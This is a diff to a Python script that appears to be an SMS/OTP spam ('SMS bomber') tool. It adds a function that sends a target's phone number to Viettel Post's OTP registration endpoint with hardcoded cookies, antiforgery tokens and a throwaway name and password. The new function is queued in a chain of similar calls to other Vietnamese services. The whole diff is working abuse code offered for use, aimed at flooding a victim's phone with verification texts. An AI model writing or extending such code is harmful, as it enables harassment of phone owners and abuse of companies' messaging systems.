@@ -3736,6 +3736,102 @@ def vietloan():
     except requests.exceptions.RequestException:
         print("VIETLOAN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
+def viettelpost():
+    cookies = {
+        'QUIZIZZ_WS_COOKIE': 'id_192.168.12.141_15001',
+        '.AspNetCore.Antiforgery.XvyenbqPRmk': 'CfDJ8ASZJlA33dJMoWx8wnezdv-ldmCeCauiRwoNjbMuIi_12RwO7MX0bWiH1o0iU8D3b4WYfRUPQnjqeIiIpn3XmYRFi_KAJ99Y0oUQzmpZyla6brgkixhji6p2GHBun7BmyV5E_Ktge00TOT2nKbyulVM',
+        '_gid': 'GA1.2.766667119.1722475009',
+        '_ga_P86KBF64TN': 'GS1.1.1722475009.1.1.1722475193.0.0.0',
+        '_ga_7RZCEBC0S6': 'GS1.1.1722475008.1.1.1722475193.0.0.0',
+        '_ga': 'GA1.1.283730043.1722475009',
+        '_ga_WN26X24M50': 'GS1.1.1722475008.1.1.1722475193.0.0.0',
+    }
+
+    headers = {
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Cache-Control': 'max-age=0',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        # 'Cookie': 'QUIZIZZ_WS_COOKIE=id_192.168.12.141_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv-ldmCeCauiRwoNjbMuIi_12RwO7MX0bWiH1o0iU8D3b4WYfRUPQnjqeIiIpn3XmYRFi_KAJ99Y0oUQzmpZyla6brgkixhji6p2GHBun7BmyV5E_Ktge00TOT2nKbyulVM; _gid=GA1.2.766667119.1722475009; _ga_P86KBF64TN=GS1.1.1722475009.1.1.1722475193.0.0.0; _ga_7RZCEBC0S6=GS1.1.1722475008.1.1.1722475193.0.0.0; _ga=GA1.1.283730043.1722475009; _ga_WN26X24M50=GS1.1.1722475008.1.1.1722475193.0.0.0',
+        'Origin': 'null',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-User': '?1',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+
+    data = {
+        'FormVerifyOtpModel.Phone': '',
+        'FormVerifyOtpModel.Email': '',
+        'FormVerifyOtpModel.Password': '',
+        'FormVerifyOtpModel.UserId': '',
+        'FormForgotPassword.Email': '',
+        'FormForgotPassword.UserId': '',
+        'FormForgotPassword.OtpRequestToken': 'hQJjQ5MHm/+Xhhl4WE/bgqiz4zCSvnT05qKj6TdLzs8KoYZsamRBy8gm8QhpxICqva9jHMo6V25AHvcBwxd1XKKwAEtKLyQEf4MzKeDh0xcoyQ1uuOGDCU3BIZUVmpbS2xVvglOZJs4srUSPHb+JLY+l+plhFg3xKvRJBLWpX0SSiip2/oxddKFM4tXwC0QGY8JYhI6UUF/8lwVKqM12H+cd4/DB3SEwaXkix8HEy+RpAnPCNw7N1ZjmTGxwP6cHz8lr6sEIg+mMXiOB/neVMK8xib3SiJf5p7RyzPf7J+CYANyeiU9YGQ0TZJFfSRHm9IEyW6PmxB4+4nh9h5CGU6/7EAw4924l',
+        'FormRegister.FullName': 'quoc tien huy',
+        'FormRegister.UserName': '',
+        'FormRegister.Email': '',
+        'FormRegister.Phone': sdt,
+        'FormRegister.ConfirmPhone': 'False',
+        'FormRegister.ConfirmEmail': 'False',
+        'FormRegister.RequiredPhone': 'False',
+        'FormRegister.RequiredEmail': 'False',
+        'FormRegister.Provider': '',
+        'FormRegister.ProviderUserId': '',
+        'FormRegister.Password': '123123aA',
+        'FormRegister.ConfirmPassword': '123123aA',
+        'FormRegister.IsRegisterFromPhone': 'True',
+        'FormRegister.UserId': '',
+        'FormMergeModel.JsonListEmailConflict': '',
+        'FormMergeModel.JsonListPhoneConflict': '',
+        'FormMergeModel.EmailSelected': '',
+        'FormMergeModel.PhoneSelected': '',
+        'FormMergeModel.PhoneVerify': '',
+        'FormMergeModel.EmailVerify': '',
+        'FormMergeModel.IsRequiredSelect': 'False',
+        'FormMergeModel.Password': '',
+        'FormMergeModel.Provider': '',
+        'FormMergeModel.ProviderUserId': '',
+        'FormMergeModel.IsEmailVerified': 'False',
+        'FormMergeModel.IsPhoneVerified': 'False',
+        'FormNotMergeModel.Password': '',
+        'FormNotMergeModel.Provider': '',
+        'FormNotMergeModel.ProviderUserId': '',
+        'FormNotMergeModel.UserSSOId': '',
+        'FormNotMergeModel.EmailSelected': '',
+        'FormNotMergeModel.PhoneSelected': '',
+        'FormNotMergeModel.NotMergePhoneVerify': '',
+        'FormNotMergeModel.NotMergeEmailVerify': '',
+        'FormNotMergeModel.IsEmailVerified': 'False',
+        'FormNotMergeModel.IsPhoneVerified': 'False',
+        'FormLoginOTP.Username': '',
+        'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=2fm315xzemzryzwbsz8jfj',
+        'ConfirmOtpType': 'Register',
+        'UserClientId': '',
+        'ClientId': '',
+        'OTPCode1': '',
+        'OTPCode2': '',
+        'OTPCode3': '',
+        'OTPCode4': '',
+        'OTPCode5': '',
+        'OTPCode6': '',
+        '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv-9JDAZiojDWGeKRvEUJqdyE128lDNBqZyxK9-1bDuTNAgW17qbK9uBU6V-VwQFZywRBM06-A6m7VU2ACjP9_OVf1RWEqp2aTwboyIFSzmLAXCbIuwwASKM6jHPCb2IAJ0',
+    }
+
+    try:
+        response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', cookies=cookies, headers=headers, data=data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("VIETTELPOST | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("VIETTELPOST | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+
 vietloan()
 time.sleep(0.3)
 tv360()
@@ -3921,4 +4017,6 @@ time.sleep(0.3)
 pasgo()
 time.sleep(0.3)
 coolmatereset()
+time.sleep(0.3)
+viettelpost()
 time.sleep(0.3)
